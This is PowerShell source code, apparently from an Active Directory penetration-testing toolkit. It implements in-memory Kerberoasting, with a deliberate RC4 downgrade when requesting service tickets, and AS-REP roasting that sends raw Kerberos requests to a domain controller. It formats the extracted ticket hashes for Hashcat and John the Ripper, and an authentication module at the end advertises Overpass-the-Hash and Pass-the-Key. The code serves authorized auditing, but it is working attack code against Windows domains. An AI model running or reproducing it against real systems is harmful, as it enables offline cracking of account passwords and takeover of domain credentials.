# Helper function to extract EncryptionType from ASN.1-encoded Kerberos ticket
function Get-EncryptionTypeFromTicket {
    param([byte[]]$TicketBytes)

    try {
        # The ticket is: [APPLICATION 1] SEQUENCE { tkt-vno, realm, sname, enc-part }
        # enc-part is: [3] EncryptedData
        # EncryptedData is: SEQUENCE { etype [0] Int32, kvno [1] UInt32 OPTIONAL, cipher [2] OCTET STRING }

        $offset = 0

        # Skip APPLICATION 1 tag (0x61)
        if ($TicketBytes[$offset] -ne 0x61) {
            Write-Log "[Get-EncryptionTypeFromTicket] Not a Ticket structure (expected 0x61, got 0x$($TicketBytes[$offset].ToString('X2')))"
            return $null
        }
        $offset++

        # Skip length
        if ($TicketBytes[$offset] -band 0x80) {
            $lenBytes = $TicketBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Now at SEQUENCE tag (0x30)
        if ($TicketBytes[$offset] -ne 0x30) {
            Write-Log "[Get-EncryptionTypeFromTicket] Expected SEQUENCE (0x30), got 0x$($TicketBytes[$offset].ToString('X2'))"
            return $null
        }
        $offset++

        # Skip SEQUENCE length
        if ($TicketBytes[$offset] -band 0x80) {
            $lenBytes = $TicketBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Search for context tag [3] (0xA3) which contains enc-part
        while ($offset -lt $TicketBytes.Length - 10) {
            if ($TicketBytes[$offset] -eq 0xA3) {
                # Found enc-part context tag
                $offset++

                # Skip length
                if ($TicketBytes[$offset] -band 0x80) {
                    $lenBytes = $TicketBytes[$offset] -band 0x7F
                    $offset += 1 + $lenBytes
                } else {
                    $offset++
                }

                # Now at EncryptedData SEQUENCE (0x30)
                if ($TicketBytes[$offset] -ne 0x30) {
                    Write-Log "[Get-EncryptionTypeFromTicket] Expected EncryptedData SEQUENCE"
                    return $null
                }
                $offset++

                # Skip SEQUENCE length
                if ($TicketBytes[$offset] -band 0x80) {
                    $lenBytes = $TicketBytes[$offset] -band 0x7F
                    $offset += 1 + $lenBytes
                } else {
                    $offset++
                }

                # Now at etype context tag [0] (0xA0)
                if ($TicketBytes[$offset] -ne 0xA0) {
                    Write-Log "[Get-EncryptionTypeFromTicket] Expected etype context tag (0xA0)"
                    return $null
                }
                $offset++

                # Skip length
                if ($TicketBytes[$offset] -band 0x80) {
                    $lenBytes = $TicketBytes[$offset] -band 0x7F
                    $offset += 1 + $lenBytes
                } else {
                    $offset++
                }

                # Now at INTEGER (0x02)
                if ($TicketBytes[$offset] -ne 0x02) {
                    Write-Log "[Get-EncryptionTypeFromTicket] Expected INTEGER for etype"
                    return $null
                }
                $offset++

                # Read integer length
                $intLen = $TicketBytes[$offset]
                $offset++

                # Read integer value
                $etype = 0
                for ($i = 0; $i -lt $intLen; $i++) {
                    $etype = ($etype -shl 8) -bor $TicketBytes[$offset + $i]
                }

                Write-Log "[Get-EncryptionTypeFromTicket] Found etype: $etype"
                return $etype
            }

            # Skip this element
            $offset++
            if ($offset -lt $TicketBytes.Length -and ($TicketBytes[$offset] -band 0x80)) {
                $lenBytes = $TicketBytes[$offset] -band 0x7F
                if ($lenBytes -gt 0 -and ($offset + 1 + $lenBytes) -lt $TicketBytes.Length) {
                    $elementLen = 0
                    for ($i = 0; $i -lt $lenBytes; $i++) {
                        $elementLen = ($elementLen -shl 8) -bor $TicketBytes[$offset + 1 + $i]
                    }
                    $offset += 1 + $lenBytes + $elementLen
                } else {
                    $offset++
                }
            } elseif ($offset -lt $TicketBytes.Length) {
                $elementLen = $TicketBytes[$offset]
                $offset += 1 + $elementLen
            }
        }

        Write-Log "[Get-EncryptionTypeFromTicket] enc-part not found in ticket"
        return $null
    }
    catch {
        Write-Log "[Get-EncryptionTypeFromTicket] Error parsing ticket: $_"
        return $null
    }
}
#endregion

#region Internal: In-Memory Method
function Invoke-KerberoastInMemory {
    param(
        [string]$SAMAccountName,
        [string]$SPN,
        [string]$Domain,
        [string]$Server,
        [System.Management.Automation.PSCredential]$Credential,
        [string]$Username,
        [string]$Password
    )

    Write-Log "[Invoke-KerberoastInMemory] Using in-memory Kerberoast for $SPN"

    # Track sensitive data for cleanup
    $securePassword = $null
    $tgtResult = $null

    try {
        # Step 0: Resolve Domain from parameter or LDAPContext
        $targetDomain = $Domain
        if (-not $targetDomain -and $Script:LDAPContext -and $Script:LDAPContext.Domain) {
            $targetDomain = $Script:LDAPContext.Domain
            Write-Log "[Invoke-KerberoastInMemory] Using domain from LDAP session: $targetDomain"
        }

        # Validate domain is available
        if (-not $targetDomain) {
            throw "Domain not specified. Use -Domain parameter or connect with Connect-adPEAS first."
        }

        # Step 1: Resolve Server (priority: parameter > LDAPContext > auto-discovery)
        $targetServer = $Server
        if (-not $targetServer -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
            $targetServer = $Script:LDAPContext.Server
            Write-Log "[Invoke-KerberoastInMemory] Using server from LDAP session: $targetServer"
        }
        if (-not $targetServer) {
            # Auto-discover domain controller
            Write-Log "[Invoke-KerberoastInMemory] No server specified, attempting auto-discovery..."
            $dcResolution = Resolve-adPEASName -Domain $targetDomain
            if ($dcResolution -and $dcResolution.Hostname) {
                $targetServer = $dcResolution.Hostname
                Write-Log "[Invoke-KerberoastInMemory] Auto-discovered server: $targetServer"
            } else {
                throw "Could not resolve domain controller for '$targetDomain'. Use -Server parameter or connect with Connect-adPEAS first."
            }
        }

        $realmUpper = $targetDomain.ToUpper()

        # Step 2: Resolve credentials (priority: Credential > Username/Password > LDAPContext)
        $effectiveCredential = $null

        if ($Credential) {
            # Explicit PSCredential takes priority
            $effectiveCredential = $Credential
            Write-Log "[Invoke-KerberoastInMemory] Using explicit PSCredential"
        }
        elseif ($Username -and $Password) {
            # Create PSCredential from Username/Password
            $securePass = ConvertTo-SecureString -String $Password -AsPlainText -Force
            $effectiveCredential = [System.Management.Automation.PSCredential]::new($Username, $securePass)
            Write-Log "[Invoke-KerberoastInMemory] Using Username/Password credentials"
        }
        elseif ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
            # Fall back to LDAP session credentials
            $effectiveCredential = $Script:LDAPContext['Credential']
            Write-Log "[Invoke-KerberoastInMemory] Using credentials from existing LDAP session"
        }
        else {
            throw "No credentials available. Use -Credential, -Username/-Password parameters, or connect with Connect-adPEAS -Credential first."
        }

        # Extract username from credential for Kerberos
        $authUserName = $effectiveCredential.UserName
        if ($authUserName -match '\\') {
            $authUserName = $authUserName.Split('\')[1]
        }
        if ($authUserName -match '@') {
            $authUserName = $authUserName.Split('@')[0]
        }

        # Step 3: Request TGT using our Kerberos stack (in-memory only!)
        Write-Log "[Invoke-KerberoastInMemory] Requesting TGT for $authUserName"

        $tgtResult = Invoke-KerberosAuth -UserName $authUserName -Domain $targetDomain -DomainController $targetServer -Credential $effectiveCredential

        if (-not $tgtResult.Success) {
            throw "Failed to obtain TGT: $($tgtResult.Error)"
        }

        Write-Log "[Invoke-KerberoastInMemory] TGT obtained (etype $($tgtResult.EncryptionType))"

        # Step 4: Request TGS with RC4 downgrade attempt
        $tgsResult = $null
        $lastError = $null

        # Request with RC4 only - KDC will return the weakest etype the service account supports
        # If service account has RC4 disabled, KDC may either:
        # - Return ETYPE_NOSUPP error (then we try AES)
        # - Return ticket with AES anyway (then we use what we got)
        try {
            Write-Log "[Invoke-KerberoastInMemory] Requesting RC4 (etype 23) for $SPN"

            $tgsResult = Request-ServiceTicket -TGT $tgtResult.TicketBytes `
                                               -SessionKey $tgtResult.SessionKeyBytes `
                                               -SessionKeyType $tgtResult.EncryptionType `
                                               -ServicePrincipalName $SPN `
                                               -Domain $targetDomain `
                                               -DomainController $targetServer `
                                               -UserName $authUserName `
                                               -DowngradeToRC4

            # If RC4 request failed with ETYPE_NOSUPP, try without downgrade (offer all etypes)
            if (-not $tgsResult.Success -and $tgsResult.Error -match 'ETYPE_NOSUPP') {
                Write-Log "[Invoke-KerberoastInMemory] RC4 not supported, trying AES..."

                $tgsResult = Request-ServiceTicket -TGT $tgtResult.TicketBytes `
                                                   -SessionKey $tgtResult.SessionKeyBytes `
                                                   -SessionKeyType $tgtResult.EncryptionType `
                                                   -ServicePrincipalName $SPN `
                                                   -Domain $targetDomain `
                                                   -DomainController $targetServer `
                                                   -UserName $authUserName
            }

            if ($tgsResult.Success) {
                Write-Log "[Invoke-KerberoastInMemory] Got ticket with etype $($tgsResult.EncryptionType) for $SPN"
            } else {
                $lastError = $tgsResult.Error
            }
        }
        catch {
            $lastError = $_.Exception.Message
        }

        Write-Log "[Invoke-KerberoastInMemory] TGT discarded (in-memory only, not persisted)"

        # Process the result
        if ($tgsResult -and $tgsResult.Success) {
            # Extract hash from ticket using centralized function
            # IMPORTANT: Use SAMAccountName (service account owner), NOT authUserName (requesting user)
            # The hash contains the service account whose password we want to crack
            $hash = Get-KerberosTicketHash -TicketBytes $tgsResult.TicketBytes `
                                           -EncryptionType $tgsResult.EncryptionType `
                                           -UserName $SAMAccountName `
                                           -Realm $realmUpper `
                                           -SPN $SPN `
                                           -TicketType "TGS"

            # Defensive check for encryption types hashtable
            # Cast to [int] for hashtable lookup compatibility (Read-ASN1Integer returns Int64)
            $etypeInfo = $null
            $etypeInt = [int]$tgsResult.EncryptionType
            if ($Script:KERBEROS_ENCRYPTION_TYPES -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($etypeInt)) {
                $etypeInfo = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt]
            }

            if ($hash) {
                Write-Log "[Invoke-KerberoastInMemory] Hash extracted for $SPN (etype $($tgsResult.EncryptionType))"
            } else {
                Write-Log "[Invoke-KerberoastInMemory] Failed to extract hash from ticket for $SPN"
            }

            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                SPN = $SPN
                Success = $true
                EncryptionType = $etypeInt
                EncryptionTypeName = if ($etypeInfo) { $etypeInfo.Name } else { "etype $etypeInt" }
                Severity = if ($etypeInfo) { $etypeInfo.Severity } else { "Unknown" }
                HashcatMode = if ($etypeInfo) { $etypeInfo.HashcatMode } else { $null }
                Hash = $hash
                Error = $null
            }
        } else {
            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                SPN = $SPN
                Success = $false
                EncryptionType = $null
                EncryptionTypeName = $null
                Severity = $null
                HashcatMode = $null
                Hash = $null
                Error = if ($lastError) { $lastError } else { "Unknown error" }
            }
        }
    }
    catch {
        Write-Log "[Invoke-KerberoastInMemory] Error: $_"

        return [PSCustomObject]@{
            SAMAccountName = $SAMAccountName
            SPN = $SPN
            Success = $false
            EncryptionType = $null
            EncryptionTypeName = $null
            Severity = $null
            HashcatMode = $null
            Hash = $null
            Error = $_.Exception.Message
        }
    }
    finally {
        # Clean up sensitive data
        if ($securePassword) {
            try { $securePassword.Dispose() } catch { }
        }

        # Clear TGT and session key from memory
        if ($tgtResult) {
            if ($tgtResult.TicketBytes) {
                [Array]::Clear($tgtResult.TicketBytes, 0, $tgtResult.TicketBytes.Length)
            }
            if ($tgtResult.SessionKeyBytes) {
                [Array]::Clear($tgtResult.SessionKeyBytes, 0, $tgtResult.SessionKeyBytes.Length)
            }
        }

        Write-Log "[Invoke-KerberoastInMemory] Sensitive data cleared from memory"
    }
}
#endregion



# ----- Invoke-ASREPRoast.ps1 -----

function Invoke-ASREPRoast {
<#
.SYNOPSIS
    Tests if an AS-REP Roastable account can actually be AS-REP Roasted and extracts the hash.

.DESCRIPTION
    This function sends AS-REQ requests (without pre-authentication) for accounts with DONT_REQ_PREAUTH flag and extracts the AS-REP response hash.

    Uses raw Kerberos protocol (UDP/TCP port 88) to communicate with KDC.

    This is 100% defensive security - used for:
    - Security auditing
    - Penetration testing (with authorization)
    - Password policy compliance testing
    - Identifying weak passwords before attackers do

    Encryption Types:
    - etype 23 (RC4-HMAC) = CRITICAL - Very fast to crack
    - etype 17 (AES128) = HIGH - Harder to crack
    - etype 18 (AES256) = MEDIUM - Strongest encryption

    Hash Format:
    - Output: $krb5asrep$etype$user@realm:checksum$encrypted_part
    - Compatible with Hashcat (mode 18200)
    - Compatible with John the Ripper

.PARAMETER SAMAccountName
    The SAMAccountName of the user with DONT_REQ_PREAUTH flag

.PARAMETER Domain
    The domain name (FQDN). If not specified, uses the domain from the active session ($Script:LDAPContext.Domain).

.PARAMETER DomainController
    Optional: Specific DC to query. If not specified, uses the DC from the active session ($Script:LDAPContext.Server) or auto-discovers via SRV records.

.EXAMPLE
    Invoke-ASREPRoast -SAMAccountName "vulnuser" -Domain "contoso.com"

.EXAMPLE
    # With active session (Domain/DC from Connect-adPEAS)
    Invoke-ASREPRoast -SAMAccountName "vulnuser"

.OUTPUTS
    PSCustomObject with test results including encryption type and hash

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SAMAccountName,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$DomainController
    )

    begin {
        Write-Log "[Invoke-ASREPRoast] Starting AS-REP Roast test for $SAMAccountName"

        # Build Kerberos AS-REQ (without pre-auth)
        function New-KerberosASREQ {
            param(
                [string]$Username,
                [string]$Realm
            )

            # pvno [1] INTEGER (5)
            $pvno = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value @(5))

            # msg-type [2] INTEGER (10 = AS-REQ)
            $msgType = New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value @(10))

            # KDC-Options [0] BIT STRING (forwardable, renewable, renewable-ok)
            # 0x40000000 = forwardable, 0x00800000 = renewable, 0x00000010 = renewable-ok
            # Combined: 0x40800010
            $kdcOptions = @(0x03, 0x05, 0x00, 0x40, 0x80, 0x00, 0x10)
            $kdcOptionsTag = New-ASN1ContextTag -Tag 0 -Data $kdcOptions

            # cname [1] PrincipalName
            # PrincipalName ::= SEQUENCE {
            #     name-type [0] Int32 (1 = NT-PRINCIPAL)
            #     name-string [1] SEQUENCE OF GeneralString
            # }
            $nameType = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value @(1))
            $nameString = New-ASN1Sequence -Data (New-ASN1GeneralString -Value $Username)
            $nameStringTag = New-ASN1ContextTag -Tag 1 -Data $nameString
            $principalName = New-ASN1Sequence -Data ($nameType + $nameStringTag)
            $cnameTag = New-ASN1ContextTag -Tag 1 -Data $principalName

            # realm [2] Realm (GeneralString)
            $realmTag = New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $Realm.ToUpper())

            # sname [3] PrincipalName (krbtgt/REALM)
            $snameType = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value @(2))  # NT-SRV-INST
            $snameString1 = New-ASN1GeneralString -Value "krbtgt"
            $snameString2 = New-ASN1GeneralString -Value $Realm.ToUpper()
            $snameStringSeq = New-ASN1Sequence -Data ($snameString1 + $snameString2)
            $snameStringTag = New-ASN1ContextTag -Tag 1 -Data $snameStringSeq
            $snamePrincipal = New-ASN1Sequence -Data ($snameType + $snameStringTag)
            $snameTag = New-ASN1ContextTag -Tag 3 -Data $snamePrincipal

            # till [5] KerberosTime (20370913024805Z = far future)
            # KerberosTime is GeneralizedTime (tag 0x18), NOT GeneralString (tag 0x1B)
            $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)
            $tillTag = New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)

            # nonce [7] UInt32 (random)
            $nonce = Get-Random -Minimum 1 -Maximum 2147483647
            $nonceBytes = [System.BitConverter]::GetBytes([uint32]$nonce)
            [Array]::Reverse($nonceBytes)
            $nonceTag = New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonceBytes)

            # etype [8] SEQUENCE OF Int32 (23, 18, 17 = RC4, AES256, AES128)
            $etype23 = New-ASN1Integer -Value @(23)
            $etype18 = New-ASN1Integer -Value @(18)
            $etype17 = New-ASN1Integer -Value @(17)
            $etypeSeq = New-ASN1Sequence -Data ($etype23 + $etype18 + $etype17)
            $etypeTag = New-ASN1ContextTag -Tag 8 -Data $etypeSeq

            # Build KDC-REQ-BODY
            $kdcReqBody = $kdcOptionsTag + $cnameTag + $realmTag + $snameTag + $tillTag + $nonceTag + $etypeTag
            $kdcReqBodySeq = New-ASN1Sequence -Data $kdcReqBody
            $kdcReqBodyTag = New-ASN1ContextTag -Tag 4 -Data $kdcReqBodySeq

            # Build AS-REQ
            $asReq = $pvno + $msgType + $kdcReqBodyTag
            $asReqSeq = New-ASN1Sequence -Data $asReq
            $asReqApp = New-ASN1ApplicationTag -Tag 10 -Data $asReqSeq

            return $asReqApp
        }
    }

    process {
        try {
            # Resolve Domain and DomainController from active session if not provided
            if (-not $Domain) {
                if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
                    $Domain = $Script:LDAPContext.Domain
                    Write-Log "[Invoke-ASREPRoast] Using domain from active session: $Domain"
                } else {
                    Write-Error "[Invoke-ASREPRoast] -Domain is required when no active session exists. Use Connect-adPEAS first or provide -Domain."
                    return [PSCustomObject]@{
                        SAMAccountName = $SAMAccountName
                        Success = $false
                        EncryptionType = $null
                        EncryptionTypeName = "N/A"
                        Severity = "Unknown"
                        Hash = $null
                        Error = "No domain specified and no active session. Use Connect-adPEAS first or provide -Domain."
                    }
                }
            }

            if (-not $DomainController -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
                $DomainController = $Script:LDAPContext.Server
                Write-Log "[Invoke-ASREPRoast] Using DC from active session: $DomainController"
            }

            Write-Log "[Invoke-ASREPRoast] Testing AS-REP Roastability for $SAMAccountName@$Domain"

            # Resolve Domain Controller using unified resolver
            # If -DomainController is explicit, just resolve that hostname to IP (skip DC discovery)
            # If -DomainController is not set, use domain-based DC discovery via SRV records
            if ($DomainController) {
                $ResolvedIP = Resolve-adPEASName -Name $DomainController
                $dcResolution = [PSCustomObject]@{ Hostname = $DomainController; IP = $ResolvedIP }
            } else {
                $dcResolution = Resolve-adPEASName -Domain $Domain
            }
            $DomainController = $dcResolution.Hostname
            $ResolvedIP = $dcResolution.IP

            Write-Log "[Invoke-ASREPRoast] DC resolved: $DomainController (IP: $ResolvedIP)"

            # Determine the target for network connections (prefer IP if available)
            $KdcTarget = if ($ResolvedIP) { $ResolvedIP } else { $DomainController }
            Write-Log "[Invoke-ASREPRoast] KDC target for connections: $KdcTarget"

            # Build AS-REQ
            Write-Log "[Invoke-ASREPRoast] Building AS-REQ for $SAMAccountName"
            $asReqBytes = New-KerberosASREQ -Username $SAMAccountName -Realm $Domain

            # Send AS-REQ to KDC (Port 88 UDP/TCP)
            Write-Log "[Invoke-ASREPRoast] Sending AS-REQ to $KdcTarget`:88"

            $responseBytes = $null
            $success = $false

            # Try TCP first (more reliable for large responses)
            $tcpClient = $null
            $stream = $null
            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = 5000
                $tcpClient.SendTimeout = 5000
                Write-Log "[Invoke-ASREPRoast] Connecting to $KdcTarget port 88..."
                $tcpClient.Connect($KdcTarget, 88)
                $stream = $tcpClient.GetStream()
                $stream.ReadTimeout = 5000
                $stream.WriteTimeout = 5000

                # Kerberos TCP format: 4-byte length prefix + message
                $lengthBytes = [System.BitConverter]::GetBytes([uint32]$asReqBytes.Length)
                [Array]::Reverse($lengthBytes)
                $stream.Write($lengthBytes, 0, 4)
                $stream.Write($asReqBytes, 0, $asReqBytes.Length)
                $stream.Flush()
                Write-Log "[Invoke-ASREPRoast] Sent $($asReqBytes.Length) bytes AS-REQ"

                # Read response length (4 bytes)
                $responseLengthBytes = New-Object byte[] 4
                $readCount = $stream.Read($responseLengthBytes, 0, 4)
                if ($readCount -ne 4) {
                    throw "Failed to read response length header (got $readCount bytes)"
                }
                [Array]::Reverse($responseLengthBytes)
                $responseLength = [System.BitConverter]::ToUInt32($responseLengthBytes, 0)
                Write-Log "[Invoke-ASREPRoast] Response length: $responseLength bytes"

                if ($responseLength -eq 0 -or $responseLength -gt 65535) {
                    throw "Invalid response length: $responseLength"
                }

                # Read response body
                $responseBytes = New-Object byte[] $responseLength
                $bytesRead = 0
                while ($bytesRead -lt $responseLength) {
                    $chunk = $stream.Read($responseBytes, $bytesRead, $responseLength - $bytesRead)
                    if ($chunk -eq 0) {
                        throw "Connection closed while reading response (got $bytesRead of $responseLength bytes)"
                    }
                    $bytesRead += $chunk
                }

                $success = $true
                Write-Log "[Invoke-ASREPRoast] Received AS-REP ($responseLength bytes)"

            } catch {
                Write-Log "[Invoke-ASREPRoast] TCP failed: $_"
            } finally {
                if ($stream) { try { $stream.Close() } catch { } }
                if ($tcpClient) { try { $tcpClient.Close() } catch { } }
            }

            # If TCP failed or returned 0-length response, try UDP
            if (-not $success) {
                Write-Log "[Invoke-ASREPRoast] Trying UDP..."
                $udpClient = $null
                try {
                    $udpClient = New-Object System.Net.Sockets.UdpClient
                    $udpClient.Client.ReceiveTimeout = 5000
                    $udpClient.Client.SendTimeout = 5000

                    # UDP Kerberos: no length prefix, just the raw message
                    $udpClient.Send($asReqBytes, $asReqBytes.Length, $KdcTarget, 88) | Out-Null
                    Write-Log "[Invoke-ASREPRoast] Sent $($asReqBytes.Length) bytes via UDP to $KdcTarget`:88"

                    # Receive response
                    $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
                    $responseBytes = $udpClient.Receive([ref]$remoteEP)

                    if ($responseBytes -and $responseBytes.Length -gt 0) {
                        $success = $true
                        Write-Log "[Invoke-ASREPRoast] Received $($responseBytes.Length) bytes via UDP"
                    }
                } catch {
                    Write-Log "[Invoke-ASREPRoast] UDP failed: $_"
                } finally {
                    if ($udpClient) { try { $udpClient.Close() } catch { } }
                }
            }

            if (-not $success) {
                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $null
                    EncryptionTypeName = "N/A"
                    Severity = "Unknown"
                    Hash = $null
                    Error = "Failed to receive AS-REP response from KDC (TCP and UDP failed)"
                }
            }

            # Parse AS-REP to extract encrypted part
            Write-Log "[Invoke-ASREPRoast] Parsing AS-REP response"

            # First check if response is KRB-ERROR (Application tag 30 = 0x7E)
            if ($responseBytes.Length -gt 2 -and $responseBytes[0] -eq 0x7E) {
                # This is a KRB-ERROR response, extract error code using proper ASN.1 parsing
                # KRB-ERROR ::= [APPLICATION 30] SEQUENCE { ... error-code [6] Int32 ... }
                $errorCode = $null
                try {
                    $krbError = Read-ASN1Element -Data $responseBytes -Offset 0
                    if ($krbError -and $krbError.Content) {
                        $innerSeq = Read-ASN1Element -Data $krbError.Content -Offset 0
                        if ($innerSeq -and $innerSeq.Content) {
                            $children = Read-ASN1Children -Data $innerSeq.Content
                            foreach ($child in $children) {
                                # error-code is context tag [6]
                                if ($child.TagNumber -eq 6) {
                                    $intElement = Read-ASN1Element -Data $child.Content -Offset 0
                                    if ($intElement -and $intElement.Content) {
                                        $errorCode = [int](Read-ASN1Integer -Content $intElement.Content)
                                    }
                                    break
                                }
                            }
                        }
                    }
                } catch {
                    Write-Log "[Invoke-ASREPRoast] Failed to parse KRB-ERROR with ASN.1: $_"
                }

                # Use centralized Kerberos error code mapping
                $errorMessage = Get-KerberosErrorMessage -ErrorCode $errorCode

                Write-Log "[Invoke-ASREPRoast] KDC returned error: $errorMessage"

                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $null
                    EncryptionTypeName = "N/A"
                    Severity = "Unknown"
                    Hash = $null
                    Error = $errorMessage
                }
            }

            $encryptionType = $null
            $encryptedPart = $null

            # Parse AS-REP using proper ASN.1 parsing (same approach as Invoke-KerberosAuth)
            # AS-REP structure: [APPLICATION 11] SEQUENCE { ... enc-part [6] EncryptedData }
            # EncryptedData: SEQUENCE { etype [0] INTEGER, kvno [1] INTEGER OPTIONAL, cipher [2] OCTET STRING }
            try {
                $root = Read-ASN1Element -Data $responseBytes -Offset 0
                Write-Log "[Invoke-ASREPRoast] Root tag: $($root.Tag) (masked: $($root.Tag -band 0x1F))"

                # AS-REP is [APPLICATION 11]
                if (($root.Tag -band 0x1F) -ne 11) {
                    throw "Unexpected response type: $($root.Tag)"
                }

                # AS-REP is [APPLICATION 11] which wraps a SEQUENCE
                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                $children = Read-ASN1Children -Data $innerSeq.Content

                foreach ($child in $children) {
                    # enc-part is context tag [6]
                    if ($child.TagNumber -eq 6) {
                        # Parse EncryptedData SEQUENCE
                        $encPartSeq = Read-ASN1Element -Data $child.Content
                        $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content

                        foreach ($encChild in $encPartChildren) {
                            if ($encChild.TagNumber -eq 0) {
                                # etype [0] INTEGER
                                # Cast to [int] for hashtable lookup compatibility (Read-ASN1Integer returns Int64)
                                $encryptionType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
                                Write-Log "[Invoke-ASREPRoast] Found etype: $encryptionType"
                            }
                            elseif ($encChild.TagNumber -eq 2) {
                                # cipher [2] OCTET STRING
                                $encryptedPart = (Read-ASN1Element -Data $encChild.Content).Content
                                Write-Log "[Invoke-ASREPRoast] Extracted encrypted part ($($encryptedPart.Length) bytes)"
                            }
                        }
                    }
                }
            }
            catch {
                Write-Log "[Invoke-ASREPRoast] ASN.1 parsing error: $_"
            }

            if (-not $encryptedPart -or -not $encryptionType) {
                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $encryptionType
                    EncryptionTypeName = if ($encryptionType -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) { $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name } else { "Unknown" }
                    Severity = "Unknown"
                    Hash = $null
                    Error = "Failed to extract encrypted part from AS-REP"
                }
            }

            # Format hash for Hashcat/John
            # Format: $krb5asrep$etype$user@realm:checksum$encrypted_part
            # RC4 (etype 23): checksum is first 16 bytes (HMAC-MD5)
            # AES (etype 17/18): checksum is last 12 bytes (truncated HMAC-SHA1)
            $checksumLength = if ($encryptionType -eq 23) { $Script:HMAC_MD5_SIZE } else { $Script:AES_CHECKSUM_SIZE }

            if ($encryptedPart.Length -lt $checksumLength) {
                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $encryptionType
                    EncryptionTypeName = if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) { $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name } else { "Unknown" }
                    Severity = "Unknown"
                    Hash = $null
                    Error = "Encrypted part too short"
                }
            }

            if ($encryptionType -eq 23) {
                # RC4-HMAC: checksum at beginning
                $checksum = $encryptedPart[0..($checksumLength - 1)]
                $encrypted = $encryptedPart[$checksumLength..($encryptedPart.Length - 1)]
            } else {
                # AES: checksum at end (last 12 bytes)
                $encrypted = $encryptedPart[0..($encryptedPart.Length - $checksumLength - 1)]
                $checksum = $encryptedPart[($encryptedPart.Length - $checksumLength)..($encryptedPart.Length - 1)]
            }

            $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
            $encryptedHex = ($encrypted | ForEach-Object { $_.ToString("x2") }) -join ''

            $hash = "`$krb5asrep`$$encryptionType`$$SAMAccountName@$($Domain.ToUpper()):$checksumHex`$$encryptedHex"

            # Determine severity
            $encryptionTypeName = "Unknown"
            $severity = "Unknown"
            $description = "Unknown encryption type"

            if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) {
                $encryptionTypeName = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name
                $severity = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Severity
                $description = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Description
            }

            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                Success = $true
                EncryptionType = $encryptionType
                EncryptionTypeName = $encryptionTypeName
                Severity = $severity
                Description = $description
                Hash = $hash
                Error = $null
            }

        } catch {
            Write-Log "[Invoke-ASREPRoast] Error: $_"
            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                Success = $false
                EncryptionType = $null
                EncryptionTypeName = "N/A"
                Severity = "Unknown"
                Hash = $null
                Error = $_.Exception.Message
            }
        }
    }

    end {
        Write-Log "[Invoke-ASREPRoast] AS-REP Roast test completed for $SAMAccountName"
    }
}



# ----- Invoke-KerberosAuth.ps1 -----

function Invoke-KerberosAuth {
<#
.SYNOPSIS
    Unified Kerberos authentication module supporting multiple authentication methods.

.DESCRIPTION
    This function provides a central entry point for Kerberos authentication using various credential types.
    It supports password-based authentication, hash-based attacks (Overpass-the-Hash, Pass-the-Key), and certificate-based PKINIT.

    Authentication Methods:
    - Password: Standard Kerberos AS-REQ with PA-ENC-TIMESTAMP (AES256 > AES128 > RC4)
    - NT-Hash (RC4-HMAC): Overpass-the-Hash attack
    - AES128 Key: Pass-the-Key with AES128-CTS-HMAC-SHA1-96
    - AES256 Key: Pass-the-Key with AES256-CTS-HMAC-SHA1-96
    - Certificate (PKINIT): Certificate-based Kerberos with Diffie-Hellman

.PARAMETER UserName
    The username to authenticate as (sAMAccountName).

.PARAMETER Domain
    Target domain for authentication (FQDN).

.PARAMETER DomainController
    Specific domain controller to target. If not specified, uses auto-discovery.

.PARAMETER Credential
    PSCredential object for password-based authentication.

.PARAMETER Password
    Plain text password for authentication (converted to key internally).

.PARAMETER NTHash
    NT-Hash (NTLM hash) for RC4-HMAC authentication (Overpass-the-Hash).
    Format: 32 hex characters (e.g., "32ED87BDB5FDC5E9CBA88547376818D4")

.PARAMETER AES256Key
    AES256 key for AES256-CTS-HMAC-SHA1-96 authentication (Pass-the-Key).
